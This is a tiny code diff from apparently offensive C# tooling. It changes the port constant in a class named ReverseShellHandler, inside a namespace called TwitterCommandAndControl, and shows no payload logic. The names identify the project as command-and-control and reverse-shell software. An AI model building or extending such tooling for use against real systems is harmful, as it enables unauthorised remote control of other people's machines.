@@ -14,7 +14,7 @@ namespace TwitterCommandAndControl
 {
     public static class ReverseShellHandler
     {
-        private const int PORT = 6666;
+        private const int PORT = 8888;
 
         public static void Respond(string command)
         {
